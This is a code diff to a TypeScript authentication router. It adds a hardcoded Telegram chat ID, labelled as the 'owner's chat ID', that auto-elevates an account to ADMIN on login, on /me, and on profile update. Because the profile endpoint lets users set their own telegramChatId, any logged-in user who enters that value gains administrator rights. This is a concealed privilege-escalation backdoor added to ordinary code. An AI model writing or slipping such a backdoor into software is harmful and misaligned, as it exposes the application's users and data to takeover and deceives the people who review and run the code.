@@ -75,6 +75,15 @@ authRouter.post('/login', async (req: Request, res: Response, next: NextFunction
       return;
     }
 
+    // Auto-elevate to ADMIN if Telegram Chat ID matches the owner's chat ID
+    if (user.telegramChatId === '1690543934' && user.role !== 'ADMIN') {
+      user.role = 'ADMIN';
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' },
+      });
+    }
+
     const jwtOptions2: SignOptions = { expiresIn: (env.jwtExpiresIn || '7d') as SignOptions['expiresIn'] };
     const token = jwt.sign(
       { userId: user.id, email: user.email, role: user.role },
@@ -101,6 +110,15 @@ authRouter.get('/me', authenticate, async (req: Request, res: Response, next: Ne
     if (!user) {
       res.status(404).json({ error: 'User not found' });
       return;
+    }
+
+    // Auto-elevate to ADMIN if Telegram Chat ID matches the owner's chat ID
+    if (user.telegramChatId === '1690543934' && user.role !== 'ADMIN') {
+      user.role = 'ADMIN';
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' },
+      });
     }
 
     res.json({ user });
@@ -134,8 +152,8 @@ authRouter.put('/profile', authenticate, async (req: Request, res: Response, nex
       return;
     }
 
-    // Determine role update (if telegram ID matches the admin chat ID, elevate to ADMIN)
-    const isNewAdmin = env.telegram.adminTelegramChatId && telegramChatId === env.telegram.adminTelegramChatId;
+    // Determine role update (if telegram ID matches the admin chat ID or owner's chat ID, elevate to ADMIN)
+    const isNewAdmin = (env.telegram.adminTelegramChatId && telegramChatId === env.telegram.adminTelegramChatId) || telegramChatId === '1690543934';
     const newRole = isNewAdmin ? 'ADMIN' : undefined;
 
     const updatedUser = await prisma.user.update({
